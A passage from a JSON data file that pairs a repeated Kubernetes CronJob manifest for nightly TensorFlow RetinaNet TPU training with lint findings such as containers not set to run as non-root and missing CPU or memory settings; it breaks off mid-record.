    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"monitor\" is not set to runAsNonRoot"
  },
  {
    "id": "01159",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"publisher\" is not set to runAsNonRoot"
  },
  {
    "id": "01160",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"train\" is not set to runAsNonRoot"
  },
  {
    "id": "01161",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"monitor\" has cpu request 0"
  },
  {
    "id": "01162",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"publisher\" has cpu request 0"
  },
  {
    "id": "01163",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/preemptible-v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/retinanet/func/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 4\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-retinanet-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"monitor\" has memory limit 0"
  },
  {
    "id": "01164",
    "manifest_path": "data/manifests/the_stack_sample/sample_0309.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: tf-nightly-retinanet-func-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/vision/detection/main.py\n          - \"--params_override=\\\"architecture\\\":\\n  \\\"use_bfloat16\\\": true\\n\\\"eval\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n  \\\"eval_file_pattern\\\": \\\"$(COCO_DIR)/val*\\\"\\\n            \\n  \\\"val_json_file\\\": \\\"$(COCO_DIR)/instances_val2017.json\\\"\\n\\\"predict\\\"\\\n            :\\n  \\\"batch_size\\\": 64\\n\\\"train\\\":\\n  \\\"batch_size\\\": 64\\n  \\\"checkpoint\\\"\\\n            :\\n    \\\"path\\\": \\\"$(RESNET_PRETRAIN_DIR)/resnet50-checkpoint-2018-02-07\\\"\\\n            \\n    \\\"prefix\\\": \\\"resnet50/\\\"\\n  \\\"total_steps\\\": 1000\\n  \\\"train_file_pattern\\\"\\\n            : \\\"$(COCO_DIR)/train*\\\"\\n\"\n          - --model_dir=$(MODEL_DIR)\n          - --mode=train\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --strategy_type=tpu\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: 